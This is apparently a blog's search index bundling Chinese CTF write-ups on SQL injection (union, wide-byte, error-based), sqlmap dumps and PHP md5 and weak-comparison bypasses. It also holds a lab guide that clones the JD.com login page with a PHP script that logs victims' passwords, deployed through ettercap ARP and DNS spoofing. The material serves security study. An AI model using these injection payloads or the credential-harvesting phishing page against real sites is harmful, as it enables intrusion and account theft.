<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>guestbook</title>
    <url>/2020/04/18/Guestbook/</url>
    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><a id="more"></a>
<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="keyword">read</span>&amp;id=-<span class="number">1</span>%20union%20select%201,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>%20<span class="comment">#</span></span><br><span class="line">//id=-<span class="number">1</span> 是让前面的内容不显示</span><br></pre></td></tr></table></figure>
<p>3被回显</p>
<p>1.查看数据库名</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="keyword">read</span>&amp;id=-<span class="number">1</span>%20union%20select%201,<span class="number">2</span>,database(),<span class="number">4</span>%20<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>数据库的名字<code>g8</code></p>
<p>2.查看表名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=<span class="keyword">read</span>&amp;id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>#</span><br></pre></td></tr></table></figure>
<p>发现有一个表 <code>flag</code></p>
<p>3.测试表的字段</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=<span class="keyword">read</span>&amp;id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'flag'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>#</span><br></pre></td></tr></table></figure>
<p>仍然显示<code>flag</code></p>
<p>4.读取flag   </p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=<span class="keyword">read</span>&amp;id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">4</span>#</span><br></pre></td></tr></table></figure>

<p>得到flag!</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku</title>
    <url>/2020/08/08/Bugku/</url>
    <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><a id="more"></a>

<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1' and 1=1 #      </span><br><span class="line">  </span><br><span class="line">1' and 1=2 #</span><br></pre></td></tr></table></figure>
<p>   不显示内容，可以判断存在注入点</p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`

  database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
<p> 得到flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
<p><img src="/2020/08/08/Bugku/cjd1.png" alt></p>
<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p>
<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p>
<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p>
<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p>
<hr>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre><hr>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
<p>database:<strong>web1002-1</strong></p>
<p>爆表名</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p>
<p>爆字段名</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>获取内容</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p>
<p>提交发现不对</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>获取address中的内容</p>
<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column ‘flag2’ in ‘where clause’</p>
<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
<p><strong>！！！注意把flag改为小写字母</strong></p>
<hr>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>加单引号报错</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre><p>查看所有的表</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>查看表中的列</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
<p>获取字段内容</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>获取数据库名</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
 --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre><p>获取表名</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI</title>
    <url>/2020/08/16/SSTI/</url>
    <content><![CDATA[<p><img src="/2020/08/16/SSTI/SSTI%E6%A8%A1%E6%9D%BF.png" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>STTI</tag>
      </tags>
  </entry>
  <entry>
    <title>jdtest</title>
    <url>/2020/07/18/jdtest/</url>
    <content><![CDATA[<h1 id="爬取京东商品图片的小测试"><a href="#爬取京东商品图片的小测试" class="headerlink" title="爬取京东商品图片的小测试"></a>爬取京东商品图片的小测试</h1><a id="more"></a>
<p>访问的页面<br><img src="/2020/07/18/jdtest/jd.png" alt="1"><br>图片链接的位置<br><img src="/2020/07/18/jdtest/link.png" alt="2"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding = utf - 8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/7/16 14:54</span></span><br><span class="line"><span class="comment">#@Author : sunzy</span></span><br><span class="line"><span class="comment">#@File : jd.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">dir = <span class="string">"jdtp"</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dir):</span><br><span class="line">    os.mkdir(dir)</span><br><span class="line"></span><br><span class="line">baseurl = <span class="string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span></span><br><span class="line"></span><br><span class="line">head = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span></span><br><span class="line">    &#125;</span><br><span class="line">response = requests.get(url=baseurl, headers = head)</span><br><span class="line"><span class="comment">#print(response.text)</span></span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line">findlinks = <span class="string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span></span><br><span class="line"><span class="comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span></span><br><span class="line">urls = re.findall(findlinks, html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    file_name = url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">    res = requests.get(<span class="string">"http:"</span>+url,headers = head)</span><br><span class="line">    <span class="keyword">with</span> open(dir+<span class="string">'/'</span>+file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(res.content)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>diaoyu</title>
    <url>/2020/07/18/diaoyu/</url>
    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><a id="more"></a>
<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="/2020/07/18/diaoyu/9.png" alt><br>修改index.html中的内容<br><img src="/2020/07/18/diaoyu/10.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$nam = stripslashes($_POST[<span class="string">'name'</span>]); <span class="comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span></span><br><span class="line">$pas = stripslashes($_POST[<span class="string">'pass'</span>]);<span class="comment">//pass也一样</span></span><br><span class="line">$content = <span class="string">"您已捕获京东账号及密码1个："</span> . <span class="string">" 用户名 "</span> . $nam . <span class="string">" 密码 "</span> . $pas;   <span class="comment">//保存捕获的用户名和密码</span></span><br><span class="line">$filed = @fopen(<span class="string">"1.txt"</span>, <span class="string">"a+"</span>);   <span class="comment">//打开1.txt</span></span><br><span class="line">@fwrite($filed, <span class="string">"$content\n"</span>);     <span class="comment">//将用户名和密码写入1.txt</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">goBack</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			window.history.back() <span class="comment">//后退+刷新</span></span><br><span class="line">		&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=<span class="string">"goBack()"</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p>
<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="/2020/07/18/diaoyu/1.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）" target="_blank" rel="noopener">www.jd.com看看网站发布是否成功）</a></p>
<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2<br>  <img src="/2020/07/18/diaoyu/4.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" alt></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku1-10</title>
    <url>/2020/09/06/bugku1-10/</url>
    <content><![CDATA[<h1 id="bugku刷题记录1"><a href="#bugku刷题记录1" class="headerlink" title="bugku刷题记录1"></a>bugku刷题记录1</h1><a id="more"></a>





<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>查看源码即可</p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>修改前端代码</p>
<p><img src="/2020/09/06/bugku1-10/%E8%AE%A1%E7%AE%97%E5%99%A8.png" alt></p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>payload:</p>
<p><code>?what=flag</code></p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="/2020/09/06/bugku1-10/post.png" alt></p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>payload: <code>?num=1a</code></p>
<p>考察点：弱类型比较</p>
<blockquote>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
</blockquote>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"admin"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">//上述代码可自行测试</span></span><br></pre></td></tr></table></figure>

<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>观察上述代码，<span class="string">"admin"</span>==<span class="number">0</span> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是<span class="number">0</span>自然和<span class="number">0</span>相等</span><br><span class="line"><span class="symbol">2 </span><span class="string">"1admin"</span>==<span class="number">1</span> 比较的时候会将<span class="number">1</span>admin转化成数值,结果为<span class="number">1</span>，而“admin1“==<span class="number">1</span> 却等于错误，也就是<span class="string">"admin1"</span>被转化成了<span class="number">0</span>,为什么呢？？</span><br><span class="line"><span class="symbol">3 </span><span class="string">"0e123456"</span>==<span class="string">"0e456789"</span>相互比较的时候，会将<span class="number">0e</span>这类字符串识别为科学技术法的数字，<span class="number">0</span>的无论多少次方都是零，所以相等</span><br></pre></td></tr></table></figure>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>查看源码后，在最下面看到一串编码，为unicode编码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;#<span class="number">75</span>;&amp;#<span class="number">69</span>;&amp;#<span class="number">89</span>;&amp;#<span class="number">123</span>;&amp;#<span class="number">74</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">52</span>;&amp;#<span class="number">50</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">104</span>;&amp;#<span class="number">74</span>;&amp;#<span class="number">75</span>;&amp;#<span class="number">45</span>;&amp;#<span class="number">72</span>;&amp;#<span class="number">83</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">49</span>;&amp;#<span class="number">73</span>;&amp;#<span class="number">73</span>;&amp;#<span class="number">73</span>;&amp;#<span class="number">125</span>;</span><br></pre></td></tr></table></figure>

<p>使用工具转换为字符穿</p>
<p><img src="/2020/09/06/bugku1-10/5.png" alt></p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><strong>dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名</strong></p>
<p><strong>hosts就是本地用来解析域名为IP</strong>  </p>
<p>因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问</p>
<p>（hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts）</p>
<p>路径为：C:\Windows\System32\drivers\etc</p>
<p><img src="/2020/09/06/bugku1-10/host.png" alt></p>
<p>文件保存后在浏览器中访问该域名 获得flag</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>打开页面什么也没有，源码也没有什么发现，抓包试试</p>
<p>go完也没什么反应，有点迷惑</p>
<p>但是多go几次后，发现有张图片在变</p>
<p><img src="/2020/09/06/bugku1-10/stop.png" alt></p>
<p>多go几次就出来了flag,原理还未知</p>
<p><img src="/2020/09/06/bugku1-10/stop1.png" alt></p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">  $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p> 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 </p>
<p> <strong>Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。</strong> </p>
<p> <strong>GLOBALS:一个包含了全部变量的全局组合数组</strong> </p>
<p>即将include”flag.php”作为全局变量在本页面输出</p>
<p>?args=GLOBALS</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>源码中一串特别的代码直接放在浏览器的控制台中运行</p>
<p><img src="/2020/09/06/bugku1-10/web5.png" alt></p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开页面什么也没有</p>
<p>扫描目录，扫出来一大堆没用的，直接抓包</p>
<p>。。。。就出来了</p>
<p><img src="/2020/09/06/bugku1-10/toudengcang.png" alt></p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>名字提示了，网站被黑。</p>
<p>打开题目，发现鼠标动不了，可能是被黑后的后遗症</p>
<p>先扫描目录发现了<code>shell.php</code>,这可能是上次黑客留下的小马文件</p>
<p><img src="/2020/09/06/bugku1-10/hack2.png" alt></p>
<p>打开页面，需要密码，这就需要爆破了(查看了wp,知道了密码为hack,不知道时就需要一个足够大的密码字典才能破解)</p>
<p>确定要爆破的变量</p>
<p><img src="/2020/09/06/bugku1-10/hack3.png" alt></p>
<p>加载密码字典</p>
<p><img src="/2020/09/06/bugku1-10/hack4.png" alt></p>
<p>出现结果（根据length确定密码）</p>
<p><img src="/2020/09/06/bugku1-10/hack.png" alt></p>
<p>密码为<code>hack</code></p>
<p>登录即可</p>
<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>随便输入一个账号发现提示IP</p>
